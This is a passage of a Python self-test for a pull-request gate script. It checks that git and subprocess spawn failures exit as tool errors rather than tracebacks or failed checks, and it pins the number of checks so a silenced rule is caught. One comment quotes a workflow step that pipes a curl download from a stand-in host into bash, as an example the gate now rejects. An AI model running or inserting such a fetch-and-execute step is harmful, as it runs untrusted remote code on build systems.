source = pathlib.Path(pr_gate.__file__).read_text()
status_calls = source.count('"status", "--porcelain"')
check("both git status call sites are still present", status_calls == 2, status_calls)

# Every git invocation goes through git(), which dies on a non-zero exit *and* on a spawn
# failure. Adding those guards call site by call site is what failed twice: run() gained an
# OSError guard while this path kept only FileNotFoundError, so a git on PATH that cannot be
# executed still escaped as a traceback (exit 1) — and the drift check's status call had no
# spawn guard at all. The rule is enforced structurally instead: a raw subprocess.run may live
# only in the three functions that own a guard.
SPAWNERS = {"git", "run", "have_module"}


def raw_spawns_in(text):
    found = []
    for node in ast.walk(ast.parse(text)):
        if (isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
                and node.name not in SPAWNERS):
            for inner in ast.walk(node):
                if (isinstance(inner, ast.Call) and isinstance(inner.func, ast.Attribute)
                        and inner.func.attr == "run"
                        and isinstance(inner.func.value, ast.Name)
                        and inner.func.value.id == "subprocess"):
                    found.append(f"{node.name}:{inner.lineno}")
    return found


check("no function spawns a subprocess outside the three that guard it",
      not raw_spawns_in(source), "; ".join(raw_spawns_in(source)))
# Positive control, per the lesson from the round that shipped a rule which survived its own
# blinding: on a clean file this rule returns the same empty answer whether it works or not.
check("that rule can actually detect a raw spawn",
      raw_spawns_in("def elsewhere():\n    subprocess.run(['git', 'status'])\n") != [])
check("git() dies on a non-zero exit rather than returning empty stdout as an answer",
      re.search(r'def git\(.*?if out\.returncode != 0:\s*\n\s*die\(', source, re.S) is not None)

# Behavioural, per spawn failure that is not FileNotFoundError: a git present on PATH but not
# executable raises PermissionError, also an OSError, and used to escape as a traceback.
for label, thunk in (("changed_files", lambda: pr_gate.changed_files("origin/264")),
                     ("the drift check", pr_gate.run_cci_reference_drift)):
    prior_spawn, prior_run = subprocess.run, pr_gate.run
    try:
        subprocess.run = lambda *a, **k: (_ for _ in ()).throw(PermissionError(13, "denied"))
        pr_gate.run = lambda cmd: (0, "", 0.0)
        try:
            thunk()
            perm_code = 0
        except SystemExit as exc:
            perm_code = exc.code
    finally:
        subprocess.run, pr_gate.run = prior_spawn, prior_run
    check(f"a git that cannot be executed is a tool error in {label}, not a traceback",
          perm_code == 2, perm_code)

# ...and the exit code, not only the shape of the branch. Returning 1 here presented an
# unusable git as a failed check — an infrastructure problem wearing a code verdict — while the
# two calls in changed_files() already died. The generator is stubbed out because with a broken
# root it fails first and the status branch is never reached.
no_repo = tempfile.mkdtemp()
prior_root, prior_run = pr_gate.REPO_ROOT, pr_gate.run
try:
    pr_gate.REPO_ROOT = no_repo
    pr_gate.run = lambda cmd: (0, "", 0.0)
    try:
        with outside_any_repo(no_repo):
            pr_gate.run_cci_reference_drift()
        drift_code = 0
    except SystemExit as exc:
        drift_code = exc.code
finally:
    pr_gate.REPO_ROOT, pr_gate.run = prior_root, prior_run
    os.rmdir(no_repo)
check("an unusable git makes the drift check a tool error (exit 2), not a failed check",
      drift_code == 2, drift_code)

# The same class one layer down: a command that cannot be spawned at all raised OSError out of
# run(), escaped main() as a traceback, and left the interpreter exiting 1 — a tool error read
# as a gating failure, the very confusion the 0/1/2 contract exists to prevent.
try:
    pr_gate.run(["a_binary_that_does_not_exist_anywhere", "x"])
    spawn_code = 0
except SystemExit as exc:
    spawn_code = exc.code
check("an unspawnable command is a tool error (exit 2), not a traceback",
      spawn_code == 2, spawn_code)
check("a timeout stays a check failure, since a hanging check is the change's own doing",
      re.search(r'except subprocess\.TimeoutExpired:.*?return 1,', source, re.S) is not None)

broken_git = tempfile.mkdtemp()
try:
    # An unreadable repo: `git status` cannot succeed, so the gate must be a tool error
    # (exit 2) rather than a verdict computed from an empty result.
    prior_root = pr_gate.REPO_ROOT
    pr_gate.REPO_ROOT = broken_git
    try:
        with outside_any_repo(broken_git):
            code, out = main_with(["--base", "origin/264"])
        check("an unusable repo is a tool error, not a clean selection",
              code == 2, f"exit {code}: {out[-200:]}")
    finally:
        pr_gate.REPO_ROOT = prior_root
finally:
    os.rmdir(broken_git)

code, out = run_gate("--changed-files-from", os.devnull)
check("an empty change set is a clean pass, not an error", code == 0, out[-300:])
code, out = run_gate("--changed-files-from", "/no/such/file")
check("an unreadable change list is a tool error (exit 2)", code == 2, code)

print("\n" + "=" * 100)
if FAILED:
    print(f"{len(FAILED)} FAILED: {', '.join(FAILED)}")
# Reported before the early exit, not after it: exiting on `FAILED` first meant a red run never
# printed the count, so an edit that both broke a rule and silenced another showed only the break —
# and the silencing was invisible until someone fixed the break and ran again. Both are findings.
# Pinned so a check that stops running is a failure rather than a smaller number nobody reads.
#
# The two directions are not the same event and used to print the same sentence — "update EXPECTED
# deliberately" — which is an instruction to make the failure go away. That is the wrong advice in
# one direction and, worse, it was the *only* output for a step added to the workflow: a step
# spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
# integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
# message had to stop inviting that response either way.)
EXPECTED = 443
REACHED = PASSED + len(FAILED)
if REACHED < EXPECTED:
    print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
          "the failure this count exists to catch. Diff the [PASS]/[FAIL] labels against a known-good "
          "run to find which; lowering this number is how a silenced rule ships.")
    sys.exit(1)
if REACHED > EXPECTED:
    print(f"{REACHED} checks ran and {EXPECTED} were expected — if you added checks, raise EXPECTED "
          "at the bottom of this file.")
    sys.exit(1)
if FAILED:
    sys.exit(1)
print(f"{PASSED}/{EXPECTED} checks passed")
